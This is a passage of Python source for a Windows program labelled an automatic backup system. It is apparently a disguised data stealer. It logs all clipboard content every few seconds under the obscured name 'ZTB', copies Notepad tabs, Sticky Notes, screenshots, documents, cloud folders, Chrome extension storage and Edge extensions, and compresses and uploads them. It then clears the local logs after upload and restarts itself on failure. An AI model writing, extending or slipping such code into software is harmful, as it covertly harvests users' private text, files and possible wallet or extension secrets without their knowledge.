                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # 如果压缩后仍然过大，尝试将当前块再次分割
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # 递归处理前半部分
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # 递归处理后半部分
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"最后分块: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("分割失败，没有生成有效的压缩文件")
                return None
            
            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception:
            logging.error("分割失败")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """处理部分分块
        
        Args:
            chunk: 要处理的文件列表
            temp_dir: 临时目录路径
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            compressed_files: 压缩文件列表
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """获取ZTB内容"""
        try:
            content = pyperclip.paste()
            if content is None:
                return None
            # 去除空白字符
            content = content.strip()
            return content if content else None
        except (pyperclip.PyperclipException, RuntimeError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 获取ZTB出错: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """记录ZTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录ZTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控ZTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建ZTB日志目录失败: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # 最大连续错误次数（可考虑提取为配置常量）
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # 只有当ZTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("📋 检测到ZTB更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ ZTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ ZTB监控出错: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """获取所有可用的磁盘和云盘目录"""
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # 处理普通磁盘
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # 使用Windows路径格式
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, 'docs'), 1),  # 文档类
                'configs': (disk_path, os.path.join(backup_path, 'configs'), 2),  # 配置类
            }
            logging.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的云盘文件夹
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # 使用完整路径
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, 'cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'docs'), 1),
                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'configs'), 2),
                        }
                        logging.info(f"检测到云盘目录: {item_path}")
                        
                        # 添加调试日志
                        if BackupConfig.DEBUG_MODE:
                            logging.debug(f"云盘源目录: {os.path.abspath(item_path)}")
                            logging.debug(f"云盘备份目录: {cloud_backup_path}")
        except Exception as e:
            logging.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def backup_notepad_temp(backup_manager):
    """备份记事本临时文件"""
    notepad_temp_directory = os.path.join(os.environ['LOCALAPPDATA'], 
                                        "Packages/Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState")
    notepad_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "notepad")

    if not os.path.exists(notepad_temp_directory):
        logging.error("记事本缓存目录不存在")
        return None

    if not backup_manager._clean_directory(notepad_backup_directory):
        return None

    for root, _, files in os.walk(notepad_temp_directory):
        for file in files:
            try:
                src_path = os.path.join(root, file)
                if not os.path.exists(src_path):
                    continue
                rel_path = os.path.relpath(root, notepad_temp_directory)
                dst_dir = os.path.join(notepad_backup_directory, rel_path)
                if not backup_manager._ensure_directory(dst_dir):
                    continue
                shutil.copy2(src_path, os.path.join(dst_dir, file))
            except Exception:
                continue
    return notepad_backup_directory

def backup_screenshots():
    """备份截图文件"""
    screenshot_paths = [
        os.path.join(os.environ['USERPROFILE'], "Pictures"),
        os.path.join(os.environ['ONEDRIVE'] if 'ONEDRIVE' in os.environ else os.environ['USERPROFILE'], 
                    "Pictures")
    ]
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # 扫描整个Pictures目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含"screenshot"关键字（不区分大小写）
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info(f"📸 截图备份完成，共找到包含'screenshot'关键字的文件")
    else:
        logging.info("📸 未找到包含'screenshot'关键字的截图文件")
            
    return screenshot_backup_directory if files_found else None

def backup_sticky_notes_and_browser_extensions(backup_manager):
    """备份便签与浏览器扩展数据"""
    sticky_notes_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                   "Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite")
    sticky_notes_backup_directory = os.path.join(backup_manager.config.BACKUP_ROOT, "sticky_notes")

    # 浏览器扩展相关目录
    chrome_local_ext_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                        "Google", "Chrome", "User Data", "Default", "Local Extension Settings")
    edge_extensions_dir = os.path.join(os.environ['LOCALAPPDATA'],
                                       "Microsoft", "Edge", "User Data", "Default", "Extensions")
    
    if not os.path.exists(sticky_notes_path):
        logging.error("便签数据文件不存在")
        return None
        
    if not backup_manager._ensure_directory(sticky_notes_backup_directory):
        return None
        
    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
    
    try:
        # 备份便签数据库
        shutil.copy2(sticky_notes_path, backup_file)

        # 备份 Chrome Local Extension Settings
        if os.path.exists(chrome_local_ext_dir):
            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
            try:
                if os.path.exists(target_chrome_dir):
                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_chrome_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Chrome Local Extension Settings")
            except Exception as e:
                logging.error(f"复制 Chrome 目录失败: {chrome_local_ext_dir} - {e}")

        # 备份 Edge Extensions
        if os.path.exists(edge_extensions_dir):
            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
            try:
                if os.path.exists(target_edge_dir):
                    shutil.rmtree(target_edge_dir, ignore_errors=True)
                parent_dir = os.path.dirname(target_edge_dir)
                if backup_manager._ensure_directory(parent_dir):
                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("📦 已备份: Edge Extensions")
            except Exception as e:
                logging.error(f"复制 Edge 目录失败: {edge_extensions_dir} - {e}")

        return sticky_notes_backup_directory
    except Exception as e:
        logging.error(f"复制便签或浏览器目录失败: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
        
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # 复制日志文件到临时目录
        try:
            # 读取当前日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
                
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
                
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后清空原始日志文件，只保留一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, "clipboard_log.txt")
    
    # 启动ZTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 ZTB监控线程已启动")
    
    # 启动ZTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 ZTB上传线程已启动")
    
    # 初始化ZTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"❌ 初始化ZTB日志失败: {e}")

    # 获取用户名
    username = getpass.getuser()
    current_time = datetime.now()
    logging.critical("\n" + "="*40)
    logging.critical(f"👤 用户: {username}")
    logging.critical(f"🚀 自动备份系统已启动  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("📋 ZTB监控和自动上传已启动")
    logging.critical("="*40)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(backup_manager.config.THRESHOLD_FILE):
                with open(backup_manager.config.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(backup_manager.config.THRESHOLD_FILE), exist_ok=True)
            with open(backup_manager.config.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                backup_success = True
                
                # 获取当前可用的磁盘
                available_disks = get_available_disks()
                
                # 执行备份任务
                logging.critical("\n💾 磁盘备份")
                if not backup_disks(backup_manager, available_disks):
                    backup_success = False
                
                logging.critical("\n🪟 Windows数据备份")
                if not backup_windows_data(backup_manager):
                    backup_success = False
                
                # 在备份完成后上传日志
                logging.critical("\n📝 正在上传备份日志...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"❌ 日志备份上传失败: {e}")
                    backup_success = False
                
                # 写入下次备份时间
                next_backup_time = write_next_backup_time()
                
                if backup_success:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
            
            # 每小时检查一次是否需要备份
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            # 发生错误时也更新下次备份时间
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_disks(backup_manager, available_disks):
    """备份可用磁盘
    
    Returns:
        bool: 所有备份任务是否成功完成
    """
    all_success = True
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份完成\n")
                        else:
                            logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
                            all_success = False
                    else:
                        logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 压缩失败\n")
                        all_success = False
                else:
                    logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
                    all_success = False
            except Exception as e:
                logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {str(e)}\n")
                all_success = False
    
    return all_success

def backup_windows_data(backup_manager):
    """备份Windows系统数据
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        bool: 所有Windows数据备份任务是否成功完成
    """
    all_success = True
    try:
        # 备份记事本临时文件
        notepad_backup = backup_notepad_temp(backup_manager)
        if notepad_backup:
            backup_path = backup_manager.zip_backup_folder(
                notepad_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"notepad_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 记事本临时文件备份完成\n")
                else:
                    logging.error("❌ 记事本临时文件备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 记事本临时文件压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 记事本临时文件收集失败\n")
            all_success = False
        
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 截图文件备份完成\n")
                else:
                    logging.error("❌ 截图文件备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 截图文件压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 截图文件收集失败\n")
            all_success = False
        
        # 备份便签与浏览器扩展数据
        sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager)
        if sticky_notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                sticky_notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"sticky_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("☑️ 便签数据备份完成\n")
                else:
                    logging.error("❌ 便签数据备份失败\n")
                    all_success = False
            else:
                logging.error("❌ 便签数据压缩失败\n")
                all_success = False
        else:
            logging.error("❌ 便签数据收集失败\n")
            all_success = False
                    
        return all_success
        
    except Exception:
        logging.error("Windows数据备份失败")
        return False

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的ZTB上传线程"""
    last_upload_time = datetime.now()
    min_content_size = 100  # 最小内容大小（字节）
    
    while True:
        try:
            current_time = datetime.now()
            
            # 检查是否需要上传（根据配置的间隔时间）
            if (current_time - last_upload_time).total_seconds() >= backup_manager.config.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    try:
                        # 检查文件大小
                        file_size = os.path.getsize(clipboard_log_path)
                        if file_size > min_content_size:  # 只有当内容足够时才上传
                            # 检查文件内容
                            with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                # 检查是否只包含启动信息或上传记录
                                only_status_info = all(line.startswith('=== 📋') for line in content.split('\n') if line.strip())
                                
                                if not only_status_info:
                                    # 创建临时目录
                                    temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'clipboard_logs')
                                    if backup_manager._ensure_directory(str(temp_dir)):
                                        # 创建带时间戳的备份文件名
                                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                        backup_name = f"clipboard_log_{timestamp}.txt"
                                        backup_path = os.path.join(temp_dir, backup_name)
                                        
                                        try:
                                            # 复制日志文件到临时目录
                                            shutil.copy2(clipboard_log_path, backup_path)
                                                
                                            # 上传日志文件
                                            if backup_manager.upload_file(str(backup_path)):
                                                # 上传成功后清空原始日志文件
                                                try:
                                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                                        f.write(f"=== 📋 日志已于 {current_time.strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
                                                    last_upload_time = current_time
                                                except Exception as e:
                                                    logging.error(f"❌ ZTB日志清空失败: {e}")
                                            else:
                                                logging.error("❌ ZTB日志上传失败")
                                        except Exception as e:
                                            logging.error(f"❌ 复制ZTB日志失败: {e}")
                                        finally:
                                            # 清理临时目录
                                            try:
                                                if os.path.exists(str(temp_dir)):
                                                    shutil.rmtree(str(temp_dir))
                                            except Exception as e:
                                                logging.error(f"❌ 清理临时目录失败: {e}")
                    except Exception as e:
                        logging.error(f"❌ 读取ZTB日志文件失败: {e}")
                        
        except Exception as e:
            logging.error(f"❌ 处理ZTB日志时出错: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
            continue
            
        # 等待一小段时间再检查
        time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)

def clean_backup_directory():
    """清理备份目录，但保留日志文件和时间阈值文件"""
    backup_dir = os.path.expandvars('%USERPROFILE%\\Documents\\AutoBackup')
    try:
        if not os.path.exists(backup_dir):
            return
            
        # 需要保留的文件
        keep_files = ["backup.log", "clipboard_log.txt", "next_backup_time.txt"]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def main():
    """主函数"""
    try:
        # 检查是否已经有实例在运行
        pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'备份程序已经在运行 (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # 写入当前进程PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # 注意：日志配置在 BackupManager.__init__ 中进行，无需重复配置
        
        # 检查磁盘空间
        try:
            backup_drive = os.path.splitdrive(BackupConfig.BACKUP_ROOT)[0]
            free_space = shutil.disk_usage(backup_drive).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'备份驱动器空间不足: {free_space / (1024*1024*1024):.2f}GB')
        except (OSError, IOError) as e:
            logging.warning(f'无法检查磁盘空间: {str(e)}')
        
        try:
            # 创建备份管理器实例
            backup_manager = BackupManager()
            
            # 清理旧的备份目录
            clean_backup_directory()
            
            # 启动定期备份和上传
            periodic_backup_upload(backup_manager)
                
        except KeyboardInterrupt:
            logging.info('备份程序被用户中断')
        except Exception as e:
            logging.error(f'备份过程发生错误: {str(e)}')
            # 发生错误时等待一段时间后重试
            time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
            main()  # 重新启动主程序
            
    finally:
        # 清理PID文件
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'清理PID文件失败: {str(e)}')

if __name__ == "__main__":
    main()